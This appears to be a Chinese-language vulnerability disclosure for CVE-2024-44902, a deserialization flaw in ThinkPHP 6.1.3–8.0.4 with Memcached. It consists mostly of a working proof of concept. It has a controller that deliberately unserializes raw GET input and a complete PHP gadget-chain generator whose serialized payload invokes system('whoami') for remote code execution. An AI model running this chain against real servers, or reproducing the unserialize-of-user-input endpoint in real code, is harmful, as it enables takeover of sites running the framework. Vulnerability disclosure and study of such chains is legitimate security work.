# CVE-2024-44902

## 漏洞描述
ThinkPHP v6.1.3 - v8.0.4存在一个反序列化漏洞，使得攻击者能够执行任意代码

## 影响版本

Thinkphp v6.1.3 to v8.0.4 

## 利用条件

Thinkphp安装了Memcached扩展

## 漏洞证明

- 测试环境: php8.0.7+thinkphp8.0.4+memcached3.2.0.

首先，在 app\controller\Index.php 中添加新的反序列化端点，例如:

```php
<?php

namespace app\controller;

use app\BaseController;

class Index extends BaseController
{
    public function index()
    {
        unserialize($_GET['x']);
        return '<style>*{ padding: 0; margin: 0; }</style><iframe src="https://www.thinkphp.cn/welcome?version=' . \think\facade\App::version() . '" width="100%" height="100%" frameborder="0" scrolling="auto"></iframe>';
    }

    public function hello($name = 'ThinkPHP8')
    {
        return 'hello,' . $name;
    }
}

```

您可以从以下位置生成有效负载:

```php
<?php
namespace think\cache\driver;
use think\model\Pivot;
class Memcached{
    protected $options=[];
    function __construct()
    {
        $this->options["username"]=new Pivot();
    }
}

namespace think\model;
use think\model;
class Pivot extends Model
{

}

namespace think;
abstract class Model{
    private $data = [];
    private $withAttr = [];
    protected $json = [];
    protected $jsonAssoc = true;
    function __construct()
    {
        $this->data["fru1ts"]=["whoami"];
        $this->withAttr["fru1ts"]=["system"];
        $this->json=["fru1ts"];
    }
}

namespace think\route;
use think\DbManager;
class ResourceRegister
{
    protected $registered = false;
    protected $resource;
    function __construct()
    {
        $this->registered=false;
        $this->resource=new DbManager();
    }
}
namespace think;
use think\model\Pivot;
class DbManager
{
    protected $instance = [];
    protected $config = [];
    function __construct()
    {
        $this->config["connections"]=["getRule"=>["type"=>"\\think\\cache\\driver\\Memcached","username"=>new Pivot()]];
        $this->config["default"]="getRule";
    }
}

use think\route\ResourceRegister;
$r=new ResourceRegister();
echo urlencode(serialize($r));

```

使用 payload 反序列化可以导致 RCE:
![图片](https://github.com/user-attachments/assets/ee5ff49f-0710-4b47-b9de-c949acbd15f0)


